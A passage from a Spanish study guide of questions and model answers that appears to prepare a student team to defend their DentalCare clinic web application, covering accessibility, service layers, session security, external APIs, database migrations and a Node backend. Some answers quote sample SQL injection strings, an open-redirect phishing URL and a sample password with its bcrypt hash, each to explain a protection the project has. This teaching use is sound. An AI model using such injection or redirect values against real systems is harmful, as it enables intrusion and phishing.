(`tests/db/pruebas_bd_v2.sql`), que verifican que la propia base rechace los datos inválidos.

**P20. ¿Qué cambios necesita la base de datos y por qué?**
R: Están aplicados en la base v2 y explicados en `database/CAMBIOS.md` (§15). Por ejemplo:
`cita.id_servicio` (RF-CIT-01 pide elegir tratamiento), `rol.estado` (RF-ROL-06), el estado
`PENDIENTE_CONFIRMACION` (HU-06), contraseñas con bcrypt (el seed las tenía en texto plano, lo que
incumple RNF-SEG-01) y más horarios (el seed solo traía un día por odontólogo).

**P21. ¿Qué es un template y en qué se diferencia de una página?**
R: El template es la estructura de la pantalla sin datos: dónde van el sidebar, la topbar, las
migas, el título y el contenido. La página es el template con datos reales. Por ejemplo,
`DashboardLayout` es el mismo para todas las pantallas internas; lo que cambia es el título y lo
que cada página mete con `setContent()`.

**P22. ¿Qué es un *skip link* y por qué no lo ocultan con `display: none`?**
R: Es el primer enlace de la página, "Saltar al contenido principal", para que un usuario de
teclado no tenga que recorrer todo el menú en cada pantalla (WCAG 2.4.1). Con `display: none` el
enlace sale del orden de tabulación y no se puede usar; por eso se mueve fuera de la vista con
`transform` y aparece al recibir foco.

**P23. ¿Por qué el `<main>` tiene `tabindex="-1"`?**
R: Para que pueda recibir el foco cuando se activa el *skip link* o desde código (`focusMain()`).
El `-1` significa "enfocable por programa, pero no con Tab": no agrega una parada extra al
recorrer la página.

**P24. ¿Cómo hicieron accesibles las migas de pan?**
R: Con el patrón WAI-ARIA: un `<nav>` con `aria-label="Ruta de navegación"`, una lista ordenada,
el último elemento sin enlace y con `aria-current="page"`, y los separadores con
`aria-hidden="true"` para que el lector no los lea.

**P25. ¿Qué es una condición de carrera y cómo la evitan?**
R: Ocurre cuando dos operaciones asíncronas compiten y el resultado depende de cuál termina
primero. Si el usuario pide "Citas" y luego "Pagos", la respuesta de "Citas" podría llegar
después y pintar la página equivocada. Usamos un contador de navegación: cada carga guarda su
número y, al terminar, solo pinta si sigue siendo la última. Hay una prueba automatizada que lo
verifica.

**P26. En el login, ¿por qué el foco se mueve al título al cambiar de vista?**
R: Porque el formulario que tenía el foco desaparece. Si no movemos el foco, el usuario de lector
de pantalla no se entera de que la vista cambió. Al enfocar el `<h1>`, el lector anuncia "Revisa
tu correo".

**P27. ¿Por qué el mensaje dice "*si* el correo está registrado, recibirás un enlace"?**
R: Para no revelar qué correos existen en el sistema. Si dijera "ese correo no existe", un
atacante podría probar correos hasta encontrar usuarios reales (enumeración de usuarios). Por la
misma razón el login dice "correo o contraseña incorrectos" sin decir cuál falló (RF-ACC-02).

**P28. La ficha del paciente es un template dentro de otro. ¿Eso no rompe Atomic Design?**
R: No, porque ninguno de los dos importa al otro: `DetailLayout` solo usa átomos, moléculas y
organismos, y es la página la que los combina (`layout.setContent(DetailLayout(...))`). La regla
de oro (las dependencias solo van hacia abajo) se cumple.

**P29. ¿Por qué las alergias se muestran fuera de las pestañas?**
R: Por seguridad del paciente. Una alergia (por ejemplo, a la penicilina o a un anestésico) es
información crítica que el odontólogo debe ver sin hacer clic. Por eso las alertas clínicas van
siempre visibles entre el encabezado y las pestañas.

**P30. ¿Por qué `history.replaceState` y no `pushState` para la pestaña en la URL?**
R: `pushState` agrega una entrada al historial por cada pestaña abierta, y el botón "Atrás" iría
recorriendo pestañas en lugar de volver a la página anterior. `replaceState` actualiza la URL (se
puede compartir o recargar en la misma pestaña) sin ensuciar el historial.

#### Preguntas de la fase A5 (capa de servicios, sesión y seguridad)

**P31. ¿Qué es el patrón *Service Layer* y qué problema resuelve en DentalCare?**
R: Es una capa entre la vista y la fuente de datos. Las páginas no saben si los datos vienen de
`localStorage` o de la API: llaman a `pacientesService.list()` y el servicio decide. Resuelve dos
problemas: en la fase D cambiamos de mock a API sin reescribir páginas, y las reglas (permisos,
RN-01, RN-02, validaciones) quedan en un solo lugar en vez de repetidas en cada pantalla.

**P32. ¿Cómo cambian del mock a la API real?**
R: Con la bandera `USE_MOCK` de `js/core/config.js`. Cada servicio tiene dos implementaciones con
la misma interfaz y exporta `USE_MOCK ? mock : remote`. Además, los dos lanzan el mismo `ApiError`,
así que la página maneja los errores igual. Cambiar a `false` es la única modificación.

**P33. Si el mock vive en el navegador, ¿para qué simulan latencia?**
R: Para que la interfaz se construya pensando en la espera real: spinners, `aria-busy`, botones
deshabilitados mientras se guarda. También hace aparecer los errores de asincronía, como la
condición de carrera, en esta fase y no cuando ya exista el servidor. Es aleatoria (150–300 ms)
para que las respuestas puedan llegar en desorden, y en las pruebas se pone en 0.

**P34. ¿Qué hace `mockRequest()`?**
R: Imita lo que hará el servidor en cada petición: espera la latencia, verifica la sesión (401) y
el permiso (403), ejecuta la operación y, si escribió, guarda en `localStorage` (commit). Si algo
falla, descarta los cambios en memoria (rollback). Y devuelve una copia, para que la página no
pueda modificar la base por referencia.

**P35. ¿Guardar la sesión en `localStorage` es seguro?**
R: No es una medida de seguridad, y lo asumimos así. Cualquier script de la página o el propio
usuario puede leerla y editarla. Por eso `getSession()` desconfía de lo guardado (valida la forma,
el rol y el vencimiento) y, sobre todo, la seguridad real está en los servicios y en la API: aunque
alguien se cambie el rol en el navegador, el servidor valida el token y responde 403. Por la misma
razón nunca guardamos contraseñas allí, y en la fase D evaluaremos una *cookie* `HttpOnly`.

**P36. ¿Qué pasa si `localStorage` no está disponible?**
R: `storage.js` lo prueba al iniciar escribiendo y borrando una clave. Si falla (modo privado,
almacenamiento bloqueado o Node.js en las pruebas), usa un `Map` en memoria: la aplicación sigue
funcionando, solo que los datos no sobreviven a una recarga. Además, un JSON corrupto devuelve el
valor por defecto y el almacenamiento lleno se convierte en un mensaje claro (`ApiError 507`).

**P37. ¿Para qué sirve el prefijo `dentalcare:`?**
R: `localStorage` es compartido por todo el origen. Live Server sirve todos los proyectos en
`127.0.0.1:5500`, así que otro proyecto podría usar una clave `session` y pisar la nuestra. Con el
prefijo, nuestras claves no chocan con las de nadie.

**P38. ¿Qué hace el *guard* y por qué usa `location.replace`?**
R: Cada página protegida lo llama antes de dibujar. Sin sesión, redirige al login con `?next=` para
volver después; con un rol sin permiso, a `403.html`; si todo está bien, devuelve el usuario y
sigue vigilando la sesión (si se cierra en otra pestaña o vence, redirige). Usa `replace` y no
`assign` para que la página prohibida no quede en el historial: así "Atrás" no lleva de vuelta a
ella ni produce un bucle de redirecciones.

**P39. Si existe el guard, ¿por qué los servicios vuelven a revisar permisos?**
R: Porque el guard solo controla la **navegación**: es JavaScript en el navegador del usuario y se
puede saltar. Es defensa en profundidad: la interfaz oculta lo que no aplica, el guard impide
navegar a otra sección y el servicio (en la fase C, el servidor) es el que de verdad rechaza la
operación. Solo la última capa es seguridad.

**P40. ¿Qué es una redirección abierta y cómo la evitan?**
R: Es usar un parámetro de la URL, como `?next=`, para mandar al usuario a un sitio externo. Un
atacante enviaría `login.html?next=https://sitio-falso.com`: la víctima ve nuestro login real,
ingresa y termina en una copia falsa que le pide los datos otra vez. `safeNext()` solo acepta
páginas `.html` dentro de la app, que no sean el login o el 403 y que pertenezcan al rol del
usuario; cualquier otra cosa lleva al inicio de su rol. Hay 9 pruebas de ataques bloqueados.

**P41. ¿Por qué usaron PBKDF2 y no bcrypt en el frontend?**
R: bcrypt no existe nativo en el navegador y no queremos librerías externas; PBKDF2 sí está en Web
Crypto (`crypto.subtle`). Los dos cumplen RNF-SEG-01 porque son hashes **lentos y con sal**. En el
backend (fase C) usaremos bcrypt, que es el estándar en Node. Y aclaro: el hash del frontend es solo
para el mock; con el backend, quien verifica la contraseña es el servidor.

**P42. ¿Qué es la sal y para qué sirven las 100 000 iteraciones?**
R: La sal son 16 bytes aleatorios distintos para cada usuario que se mezclan con la contraseña: dos
personas con la misma clave tienen hashes diferentes y las tablas de hashes precalculados (*rainbow
tables*) no sirven. Las iteraciones hacen el cálculo lento a propósito: para un usuario es una
fracción de segundo, pero para un atacante que quiere probar millones de claves es muy costoso.

**P43. ¿Por qué comparan los hashes "en tiempo constante" y por qué calculan un hash cuando el
correo no existe?**
R: Una comparación normal se detiene en el primer byte distinto; midiendo cuánto tarda, un
atacante podría ir adivinando (ataque de tiempo). `sameBytes` recorre siempre todos los bytes. Y si
el correo no existe y respondiéramos de inmediato, la diferencia de tiempo revelaría qué correos
están registrados; `fakeVerify` hace el mismo cálculo costoso para que las dos respuestas tarden lo
mismo. Es el complemento del mensaje genérico "Correo o contraseña incorrectos" (RF-ACC-02).

**P44. ¿Cómo funciona la recuperación de contraseña en el mock?**
R: Siempre se responde lo mismo, exista o no el correo. Si existe, se crea un token aleatorio
(`crypto.randomUUID()`) que vence en 30 minutos, sirve una sola vez y anula los enlaces anteriores.
Como el mock no envía correos, el enlace queda en una bandeja simulada (`mockOutbox`). La nueva
contraseña se valida y se guarda como hash; la vieja deja de funcionar. Todo queda en la auditoría.

**P45. ¿Qué es la "asignación masiva" y cómo la previenen?**
R: Es cuando el cliente envía campos que no debería poder escribir, por ejemplo
`{ estado_cita: 'COMPLETADA' }` al crear una cita, o un paciente que cambia su nombre cuando solo
puede cambiar sus datos de contacto. Los servicios usan `pick()`, una lista blanca de columnas
permitidas: todo lo demás se ignora.

**P46. ¿Qué cambios a la base de datos encontraron al construir los servicios?**
R: Contraseñas en texto plano en el seed, falta `rol.estado` (RF-ROL-06), la tabla `rol_permiso`
contradice el SRS (la recepcionista podía editar historias, contra RN-01), falta una tabla para los
tokens de recuperación y hay ventas `PAGADO` con saldo pendiente. El mock trabajó desde el principio
con la versión corregida, y en la fase B se aplicaron a la base real (v2, §15).

**P47. ¿Qué le falta al frontend para estar completo y cómo se conecta con lo que ya hicieron?**
R: La fase A6: los HTML de cada pantalla. Cada uno solo declara su rol (`<body data-role>`), carga
su controlador y este llama a `createAppPage()` (guard + `DashboardLayout`), pide los datos a los
servicios con `loadInto()` y los muestra con los organismos que ya existen. No hay que tocar ni los
componentes ni los servicios: esa es la ventaja de haberlos separado.

#### Preguntas de la fase A6 (pantallas por rol)

**P48. ¿Cuál es la diferencia entre un template y una página en su proyecto? Muéstrelo.**
R: `DashboardLayout` es el template: sidebar, topbar, migas, título y un hueco para el contenido.
`pages/admin/pacientes.html` es una página: usa ese template, le pone el título "Pacientes", pide
los pacientes a `pacientesService` y mete un `DataTable` en el hueco. En A6 no se creó ningún
componente: solo se compusieron los existentes con datos reales.

**P49. ¿Por qué hay 25 HTML pero solo 14 controladores?**
R: Porque varias pantallas son la misma vista para distintos roles. `pacientes.js` atiende a
administración, recepción y odontólogo; el HTML de cada carpeta declara su rol con
`<body data-role>`, y el controlador decide qué botones mostrar con `can(user, permiso)`. Así una
corrección llega a los tres roles a la vez (principio DRY).

**P50. Si el rol viene del HTML, ¿no puede alguien cambiarlo y entrar como administrador?**
R: No. El `data-role` dice qué rol **exige** la página, no qué rol **tiene** el usuario. El guard
compara ese requisito con el rol de la sesión: si alguien edita el HTML para que pida su propio rol,
solo verá la pantalla, pero cada dato lo pide a un servicio que verifica permisos con la sesión
(y en la fase C, el servidor con el token). Además, si una página no declarara rol,
`createAppPage()` falla a propósito para que no quede abierta.

**P51. ¿Cómo agenda un paciente sin ver las citas de los demás?**
R: El wizard necesita saber qué franjas están ocupadas, pero no **de quién**. Se creó
`citasService.ocupacion()`, que devuelve solo odontólogo, fecha y estado: sin paciente, sin id y sin
motivo. Es minimización de datos, importante porque son datos de salud. Una prueba verifica que cada
registro trae exactamente esas tres claves.

**P52. ¿Qué pasa cuando el paciente pide una cita?**
R: Elige tratamiento, odontólogo y una franja libre (RN-02); la cita queda *pendiente de
confirmación* (HU-06) y así lo dice el resumen final, porque muestra lo que devolvió el servicio.
Recepción la ve en su agenda con el contador "por confirmar", la confirma y pasa a *programada*.
Esa secuencia completa está en la prueba de flujos.

**P53. ¿Cómo muestran un error del servidor dentro de un formulario?**
R: El servicio lanza `ApiError` con `fields` (por ejemplo, documento repetido). `withFieldErrors()`
lo convierte en un `FieldError` y el `ModalForm` lo pinta debajo del campo exacto y le pone el foco.
El usuario sabe qué corregir sin leer un mensaje genérico.

**P54. ¿Qué es una actualización optimista y dónde la usan?**
R: Mostrar el cambio en pantalla antes de que el servidor confirme, para que la interfaz se sienta
inmediata. La usamos en el odontograma: el diente cambia de color al instante y se guarda en segundo
plano. Si el servicio lo rechaza (por ejemplo, RN-01), se muestra el error y se recarga lo guardado,
para que la pantalla nunca muestre algo que no está en la base.

**P55. ¿Por qué el menú ya no tiene "Roles y permisos" ni "Usuarios"?**
R: Porque esas pantallas no se construyeron en A6 (necesitan un servicio de usuarios que aún no
existe). Dejar el enlace llevaría a un error 404. Es una decisión consciente y está documentada como
pendiente.

**P56. ¿Cómo probaron las pantallas?**
R: Con dos pruebas en Edge real controlado desde Node por el protocolo DevTools. El recorrido entra
con cada rol a sus pantallas y verifica que cargan, que tienen un solo `<h1>`, que no desbordan en
móvil y que el guard redirige bien (sin sesión → login; rol equivocado → 403). La de flujos usa la
aplicación como una persona: registra un paciente, pide una cita, la cancela, la confirma, registra
una consulta y un abono. Ambas fallan si aparece cualquier error de JavaScript en la consola.

**P57. ¿Qué es una prueba "intermitente" (*flaky*) y qué hicieron con la suya?**
R: Una prueba que a veces pasa y a veces falla sin cambios en el código. La nuestra buscaba un botón
mientras el navegador todavía mostraba la página anterior. No la ignoramos: corregimos la espera
(hasta que la URL sea la nueva) y la corrimos varias veces seguidas hasta que fue estable. Una
prueba intermitente que se ignora termina escondiendo errores reales.

**P58. ¿Qué APIs externas consume el sistema y para qué?**
R: Dos, públicas y reales. La primera es la de **Datos Abiertos de Colombia** (`datos.gov.co`),
con los departamentos y municipios oficiales del DANE (DIVIPOLA). La usamos en el registro de
pacientes: al elegir el departamento se cargan sus municipios. La segunda es la **TRM** oficial de
la Superintendencia Financiera, también en `datos.gov.co`, con ExchangeRate-API de respaldo. La
usamos en pagos para mostrar en dólares los saldos y los presupuestos de pacientes internacionales.

**P59. ¿Cómo se consume una API REST desde JavaScript sin librerías?**
R: Con `fetch()`, que es nativo. Se arma la URL con `URL` y `URLSearchParams` (codifican los
caracteres especiales) y se hace `await fetch(url, { headers, signal })`. Luego se revisa
`response.ok` y se lee el cuerpo con `await response.json()`. Todo está en `fetchJson()` de
`services/externo.js`, para no repetirlo en cada servicio.

**P60. Si la API responde 500, ¿`fetch` lanza un error?**
R: No. `fetch` solo rechaza la promesa cuando **no hay respuesta**: sin red, DNS, CORS o
cancelación. Un 404 o un 500 llegan como respuesta normal con `response.ok === false`. Por eso
`fetchJson()` revisa `response.ok` y, si es falso, lanza un `ApiError` con el código HTTP. Si no se
revisa, el código trataría una página de error como si fueran datos.

**P61. ¿Qué pasa si la API tarda un minuto en responder?**
R: `fetch` no tiene tiempo límite propio. Usamos un `AbortController`: a los 6 segundos se llama
`controller.abort()`, la petición se cancela y se lanza un `ApiError` con código `TIMEOUT`. Luego
entra la resiliencia: caché o respaldo local. Una prueba simula una API que nunca responde y
verifica que se corta a tiempo.

**P62. ¿Y si no hay internet en el consultorio?**
R: Depende del dato. Para los municipios: primero la caché (vigente 30 días); si no hay, la copia
local de DIVIPOLA incluida en la aplicación (33 departamentos y 1.122 municipios), y el formulario
avisa "se usa la lista guardada". Para la TRM: la última consultada con su fecha y el aviso de que
no se pudo actualizar. Si nunca se consultó, se dice que no está disponible. Los pagos se siguen
registrando en pesos, porque una tasa inventada sería un dato falso de dinero. Lo probamos en el
navegador bloqueando las APIs con el protocolo DevTools.

**P63. ¿Qué es CORS y por qué la página puede leer `datos.gov.co`?**
R: Es una regla del navegador: por defecto, una página no puede leer respuestas de **otro origen**
(otro dominio, puerto o protocolo). El servidor ajeno da permiso con el encabezado
`Access-Control-Allow-Origin`. `datos.gov.co` y ExchangeRate-API responden `*`, o sea, "cualquiera
puede leerme". Lo verificamos antes de programar. Además, nuestra petición es "simple" (GET con
solo `Accept`), así que el navegador no hace la consulta previa `OPTIONS` (*preflight*). CORS **no**
es seguridad del servidor: protege al usuario del navegador. Desde Node o Postman la API se lee
igual.

**P64. ¿Por qué no usaron `http.js`, el cliente HTTP que ya tenían?**
R: Porque `http.js` agrega el token de **nuestra** sesión (`Authorization: Bearer …`). Mandarlo a
un servidor ajeno sería filtrar la credencial. Además, ante un 401 cierra la sesión, y un 401 de
un tercero no significa que nuestra sesión venció. Las APIs externas tienen su propio cliente sin
token, y una prueba verifica que la petición lleva solo el encabezado `Accept`.

**P65. ¿Hay riesgo de inyección al consultar la API?**
R: Sí: el código del departamento va dentro del filtro `$where` de SoQL (el "SQL" de Socrata). Si
alguien manipulara el valor a `05' OR '1'='1`, cambiaría la consulta. Por eso el servicio exige
exactamente dos dígitos (`/^\d{2}$/`) **antes** de construir la URL; si no cumple, responde 400 sin
llamar a la API. Además, `URLSearchParams` codifica el valor. Es el mismo principio que las
consultas parametrizadas del backend: nunca confiar en un valor que va dentro de una consulta.

**P66. ¿Confían en lo que devuelve la API?**
R: No. Es un tercero: puede cambiar de formato, devolver filas incompletas o un mensaje de error en
JSON. `normalizar()` comprueba que sea un arreglo y descarta los códigos que no cumplen el formato
DANE. Si no queda nada válido, lo trata como un fallo y usa el respaldo. En la TRM se descarta
cualquier valor fuera de 1.000–20.000 pesos por dólar. Y todo se pinta con `textContent` (a través
de `h()`), así que un nombre con HTML se muestra como texto.

**P67. ¿Cómo probaron un servicio que depende de internet?**
R: En tres niveles. (1) Pruebas unitarias con un `fetch` **falso** inyectado en la fábrica del
servicio: simulamos 500, falta de red, lentitud, JSON inválido y datos absurdos sin depender de
internet; también inyectamos el reloj para "adelantar" 31 días y probar la caché vencida. (2)
Pruebas `--live` contra las APIs reales, para detectar si cambiaron. (3) E2E en Edge con internet
y con las APIs bloqueadas. Sin la inyección de dependencias, los casos de error no se podrían
probar a voluntad.

**P68. ¿Para qué sirve la caché y cómo saben si está vencida?**
R: Evita repetir consultas, hace la pantalla más rápida y sirve de respaldo sin internet. Se guarda
`{ savedAt, value }` en `localStorage` (prefijo `dentalcare:ext:`) y es vigente si
`ahora − savedAt < TTL`. El TTL depende del dato: 30 días para municipios (casi no cambian) y 1 hora
para la TRM (cambia a diario). Una caché vencida no se borra: se usa si la red falla, avisando que
puede estar desactualizada.

**P69. ¿Por qué el respaldo de municipios se carga con `import()` dinámico?**
R: Porque son unos 26 KB que **casi nunca** se necesitan. Con `import` estático se descargarían
siempre. Con `import('../data/divipola.js')` el navegador solo lo pide cuando falla la API y no hay
caché. Es carga perezosa (*lazy loading*), parte de la misma idea de no gastar recursos que no se
usan.

**P70. Si la API de la TRM se cae, ¿se cae la página de pagos?**
R: No. La TRM se carga **aparte** de las ventas (no dentro de `loadInto()`). Si falla, la tabla, los
indicadores, el registro de ventas y los abonos siguen funcionando; solo la tarjeta de dólares
muestra el aviso y un botón "Reintentar". Es degradación elegante: una función opcional no debe
romper una esencial.

**P71. ¿Por qué guardan el nombre del municipio y no el código DANE?**
R: Es una decisión discutible y está documentada (§14.6). El nombre se muestra directo en la ficha
sin una consulta extra, y no hay reportes por región en el alcance actual. Si mañana se piden
estadísticas por municipio, lo correcto es guardar el código DANE (`CHAR(5)`) con una llave foránea
a una tabla `municipio`. La migración sería sencilla porque los nombres vienen de la lista oficial.

### Fase B: base de datos

**P72. ¿Por qué no basta con guardar la contraseña en la base si la base tiene usuario y clave?**
R: Porque los datos salen de la base por muchos caminos: un respaldo olvidado en un correo, un
volcado en un repositorio, un empleado con permiso de lectura o una inyección SQL. Si la tabla
tiene `Admin2026*`, quien la vea entra al sistema y probablemente a otras cuentas de esa persona,
porque la gente repite contraseñas. Con bcrypt, quien ve la tabla solo ve
`$2a$10$QUOB1imQ…`, que no se puede revertir. Para probar contraseñas tendría que calcular bcrypt
una por una, y bcrypt es lento a propósito. RNF-SEG-01 lo exige.

**P73. ¿Qué significa cada parte de `$2a$10$QUOB1imQipamM.ht3H2rV.Jw4ywM8z81947SjJHnnBAsjwtppK80.`?**
R: `2a` es la versión del algoritmo. `10` es el costo: 2¹⁰ = 1.024 rondas, y cada +1 duplica el
tiempo. Los 22 caracteres siguientes son la **sal** y los últimos 31 son el hash. Como la sal va
dentro del mismo texto, no hace falta otra columna, y `bcrypt.compare()` la extrae sola. Dos
usuarios con la misma contraseña tienen hashes distintos porque su sal es distinta.

**P74. ¿Para qué un `CHECK` sobre `password_hash` si el backend ya hashea?**
R: Es defensa en profundidad. Si mañana alguien escribe un endpoint nuevo y olvida hashear, o
inserta un usuario a mano en phpMyAdmin, la base rechaza el dato en vez de guardarlo en claro en
silencio. La regla vive en el único lugar por donde pasan **todas** las escrituras. Lo probamos:
`INSERT … 'Clave123*'` falla con `chk_usuario_password_bcrypt`.

**P75. ¿Por qué validan lo mismo en el formulario, en la API y en la base? ¿No es repetir?**
R: Cada capa protege de algo distinto. El formulario **ayuda** al usuario, que ve el error en el
campo, pero se puede saltar con Postman. La API **decide** con reglas que necesitan contexto, como
"¿este doctor atiende a este paciente?" (RN-01). La base **garantiza** que nada inválido se guarde,
venga de donde venga. Lo que sí sería un error es que las listas no coincidan: si la base acepta
menos que el formulario, el usuario recibe un error 500 sin entender por qué. Por eso CC, TI, CE y
PA son exactamente los mismos en las tres capas.

**P76. ¿Qué arreglaron en `rol_permiso` y qué tiene que ver con RN-01?**
R: RN-01 dice que solo el doctor asignado o el administrador editan la historia clínica. En la v1
la RECEPCIONISTA tenía `EDITAR_HISTORIA_CLINICA`, una violación directa de esa regla. Además, el
ESPECIALISTA podía registrar pagos pero **no ver** historias, que es justo su trabajo. Se rehízo la
matriz y quedó igual a la del frontend (`permissions.js`). Ojo: la tabla solo dice qué **rol**
puede editar. "Solo el doctor **asignado**" depende de los datos, y eso lo valida la API en cada
petición.

**P77. ¿Por qué una regla de negocio como RN-03 no está en la base con un `CHECK`?**
R: Porque un `CHECK` solo ve la fila que se guarda. RN-03 ("no inactivar un rol con usuarios
activos") necesita **contar filas de otra tabla**. Eso se podría hacer con un *trigger*, pero
esconde lógica de negocio en la base, es difícil de probar y el error que devuelve es poco claro.
Lo pusimos en la API, que además puede responder un mensaje entendible ("reasigne o inactive a los
3 usuarios primero").

**P78. ¿Qué es una columna generada y por qué `estado_venta` pasó a serlo?**
R: Es una columna que la base **calcula** con una fórmula sobre otras columnas de la fila. No se
escribe. `saldo_pendiente` ya era una (`monto_total − monto_pagado`). `estado_venta` se escribía a
mano y por eso la venta #2 decía PAGADO debiendo 200.000. Si un dato se puede deducir de otros,
guardarlo aparte es invitar a la contradicción. Ahora es
`CASE WHEN monto_pagado >= monto_total THEN 'PAGADO' ELSE 'PENDIENTE' END` y no puede mentir: al
pagar, cambia sola. `STORED` significa que se guarda en disco y se puede filtrar e indexar.

**P79. ¿Por qué eliminaron una tabla (`paciente_venta`)? ¿No se pierde información?**
R: No, porque no tenía información propia: sus 40 filas eran exactamente las mismas parejas que
`venta.id_paciente`. Lo verificamos con una consulta antes de borrarla. Tener el mismo hecho en dos
lugares es redundancia, lo que la normalización busca evitar. Cuando la API cree ventas nuevas,
nadie iba a llenar esa segunda tabla, y las dos fuentes se contradirían.

**P80. ¿Cuál es la diferencia entre `dentalcare_bd_v2.sql` y `migrations.sql`?**
R: La v2 crea la base **desde cero**, para una instalación nueva. La migración **transforma** una
base v1 que ya existe con `ALTER` y `UPDATE`, sin perder sus datos, que es lo que se hace en un
sistema en producción. La v2 se generó aplicando la migración y exportando, y comprobamos con
checksums que los dos caminos dan exactamente la misma base.

**P81. ¿Por qué hay que hacer una copia antes de la migración si existe `ROLLBACK`?**
R: Porque en MySQL las sentencias DDL (`ALTER TABLE`, `CREATE`, `DROP`) hacen un **commit
implícito**: se confirman en el acto y `ROLLBACK` no las deshace. Si la migración falla a mitad, la
base queda medio migrada. La copia con `mysqldump` es el único "deshacer" real. Por eso la v2
tampoco trae `DROP TABLE`: si se importa sobre una base con datos, se detiene en vez de borrar.

**P82. ¿Cómo agregaron una columna obligatoria (`cita.id_servicio`) a una tabla que ya tenía filas?**
R: En tres pasos, porque no se puede crear una columna `NOT NULL` sin valor en las filas que ya
existen. (1) Se crea admitiendo `NULL`. (2) Se llena: la cita 3 (dolor de muela) con calza, la 4
con endodoncia y el resto con valoración. (3) Se cambia a `NOT NULL` y se agrega la llave foránea.
La FK no lleva `ON DELETE CASCADE`: borrar un tratamiento no puede borrar el historial de citas.
Los tratamientos se inactivan.

**P83. En `password_reset`, ¿por qué guardan el hash del token y por qué SHA-256 y no bcrypt?**
R: El hash, por la misma razón que con las contraseñas: quien lea la tabla no puede usar los
enlaces pendientes. SHA-256 basta porque el token es **aleatorio y largo** (32 bytes = 2²⁵⁶
posibilidades): no se puede adivinar probando. bcrypt es lento a propósito para proteger
contraseñas **humanas**, que son cortas y predecibles. Con un token aleatorio esa lentitud no
aporta nada y además impediría buscar el token con un índice.

**P84. ¿Cómo probaron la base de datos?**
R: Con servidores desechables (MariaDB 10.4 y MySQL 8.0, en otros puertos) para no tocar las bases
del equipo. Hay 38 pruebas en `tests/db/pruebas_bd_v2.sql`: comprueban los datos corregidos,
intentan 18 escrituras inválidas que **deben** fallar y 8 válidas que deben funcionar. Corren
dentro de una transacción con `ROLLBACK`, así que no dejan rastro. También probamos **la prueba**:
le metimos casos saboteados, como una columna inexistente o un dato válido marcado como inválido, y
los detectó. Así un 38/38 significa algo.

**P85. ¿Encontraron algo que no esperaban?**
R: Sí, varias cosas (§17, hallazgos 20 a 25). La más útil fue que la primera versión de la prueba
daba **falsos positivos**: un error de sintaxis en la prueba contaba como "la base lo rechazó". La
otra fue que MySQL y MariaDB se comportan distinto con `GET DIAGNOSTICS`: la prueba pasaba en uno y
fallaba en el otro. Por eso probamos en los dos.

**P86. ¿Cómo está organizado el backend y por qué así?**
R: En capas: `routes/` dice qué URL atiende qué función y con qué protección, `controllers/` valida
y decide, `models/` solo ejecuta SQL y `middlewares/` hace lo que se repite en muchas rutas (sesión,
permisos, errores). Es MVC sin la vista, porque la vista es el frontend. Cada carpeta tiene una sola
razón para cambiar: si cambia una consulta, se toca un modelo; si cambia quién puede entrar, una ruta.

**P87. ¿Qué es un pool de conexiones y por qué no abren una conexión por petición?**
R: Abrir una conexión cuesta: TCP, autenticación, configuración. El pool mantiene unas pocas abiertas
(10) y las presta a cada petición; al terminar vuelve al pool. Si llegan más peticiones que
conexiones, esperan en cola en vez de saturar la base con cientos de conexiones.

**P88. ¿Cómo evitan la inyección SQL?**
R: Con consultas parametrizadas: `pool.query('… WHERE email = ?', [correo])`. El valor viaja aparte
del texto SQL, así que `' OR '1'='1` es solo un correo que no existe. En el único lugar donde se arma
SQL dinámico (el `WHERE` del listado), solo se concatenan fragmentos fijos escritos en el código.
Los valores del usuario van siempre como `?`. Hay pruebas que lo intentan en el login y en la búsqueda.

**P89. ¿Qué es un JWT y qué guardan en él?**
R: Un token firmado con tres partes: encabezado, contenido y firma. Guardamos solo el id del usuario
(`sub`), su rol y el vencimiento (`exp`, 8 horas). El contenido se puede leer, porque base64 no es
cifrado, así que no lleva nada secreto. Lo que no se puede es cambiarlo, porque la firma HMAC-SHA256
se calcula con `JWT_SECRET`, que solo conoce el servidor. Si alguien cambia el `sub`, la firma no
coincide y la API responde 401.

**P90. Si el JWT ya dice el rol, ¿por qué `verifyToken` consulta la base en cada petición?**
R: Porque un JWT es válido hasta que vence y el servidor no lleva la cuenta de los tokens que
entregó. Sin la consulta, una cuenta inactivada seguiría entrando hasta 8 horas. Con ella, el
token deja de servir al instante. Además, los permisos se leen de `rol_permiso`: si el
administrador cambia la matriz, aplica de inmediato. Cuesta una consulta por llave primaria, que es
lo más rápido que hace MySQL.

**P91. Entonces, ¿cerrar sesión invalida el token?**
R: No del todo, y es honesto decirlo. El frontend borra su copia y queda el registro `LOGOUT`, pero
si alguien copió el token antes, le sirve hasta que vence. Es la limitación de los JWT sin estado.
La solución es una lista negra (tabla de tokens revocados) o tokens de vida corta con renovación.
Está anotada para la fase D.

**P92. ¿Por qué el login tarda lo mismo si el correo no existe?**
R: Para que no se pueda averiguar qué correos están registrados. bcrypt tarda unos 80 ms a
propósito. Si con un correo inexistente respondiéramos de inmediato, midiendo el tiempo se sabría
cuál existe. Por eso siempre se ejecuta `bcrypt.compare`, contra un hash de relleno si hace falta.
Además el mensaje es el mismo en los dos casos. La prueba mide ambos tiempos.

**P93. ¿Qué pasa si dos recepcionistas registran el mismo documento al mismo tiempo?**
R: Las dos peticiones pasan la consulta "¿ya existe?", porque ninguna ha guardado todavía. Pero la
columna tiene una llave `UNIQUE`: la base deja entrar a la primera y rechaza la segunda con
`ER_DUP_ENTRY`. El controlador convierte ese error en el mismo 409 con el campo marcado. La consulta
previa da un buen mensaje y la llave `UNIQUE` da la garantía. Hay una prueba que envía las dos
peticiones a la vez.

**P94. ¿Qué es CORS y por qué no pusieron `*`?**
R: Es la regla del navegador que impide que una página lea respuestas de otro origen (otro
protocolo, dominio o puerto) salvo que el servidor lo autorice. El frontend en `:5500` y la API en
`:3000` son orígenes distintos. Con `*`, cualquier página de internet podría llamar a nuestra API
desde el navegador de un usuario. Por eso solo se permiten los orígenes de `CORS_ORIGIN`. CORS no
reemplaza la autenticación: Postman lo ignora, y por eso cada ruta exige el token.

**P95. ¿Para qué el manejador centralizado de errores?**
R: Para que todos los errores salgan con la misma forma (`{ status, message, fields, code }`, la del
`ApiError` del frontend) y para no filtrar detalles técnicos. Los controladores solo hacen `throw`.
El manejador traduce los errores de MySQL (duplicado → 409, `CHECK` → 400, base caída → 503) y a lo
desconocido le da un 500 con un mensaje genérico, mientras el detalle va a la consola del servidor.

**P96. ¿Por qué las fechas llegan como texto y no como `Date`?**
R: Por la zona horaria. Un `DATE` de MySQL convertido a `Date` de JavaScript queda a medianoche
UTC. En Colombia (UTC−5) eso es el día anterior a las 7 p. m., así que una fecha de nacimiento se
